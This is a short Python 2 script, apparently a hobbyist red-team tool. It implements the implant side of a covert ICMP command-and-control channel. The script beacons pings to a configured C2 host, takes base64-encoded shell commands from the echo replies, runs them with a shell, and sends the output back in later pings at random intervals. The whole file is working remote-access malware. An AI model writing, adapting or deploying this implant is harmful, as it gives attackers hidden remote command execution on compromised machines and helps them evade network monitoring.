#!/usr/bin/python2
# Dear future self: You used to suck at code. You probably still do.

from scapy.all import *
from os import system
from random import randrange
from base64 import b64encode, b64decode
from time import sleep

import c2_config

def send_ping(payload):
    ''' Send the call back ping. Response payload is the command to be executed '''
    # Set up the packet with IP and ICMP headers, plus custom payload
    packet_ip = IP(dst=c2_config.c2)
    packet_icmp = ICMP(type=8,seq=0x0001,id=0x0831)
    echo_reply = sr1(packet_ip/packet_icmp/payload)
    # Strips the response payload from echo reply packet
    return echo_reply[ICMP][Raw].load

def execute_command(cmd):
    '''Execute command from c2'''
    if cmd in "kill":
        exit()
    results = subprocess.Popen(cmd, shell=True,
                          stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                          stdin=subprocess.PIPE)
    parsed_results = results.stdout.read() + results.stderr.read()
    return_payload = cmd + ' ' + str(parsed_results)
    return return_payload

def main():
    payload = ""
    client_key = "0xdeadbeef"
    server_key = "0xdeaddead"
    while True:
        c2_response = send_ping(client_key + payload)
        if len(c2_response) > 10 and c2_response[:10] == server_key:
            payload = b64encode(execute_command(b64decode(c2_response[10:])))
        else:
            payload = ""
        sleep(randrange(31))
#        sleep(1)

if __name__ == "__main__":
    main()

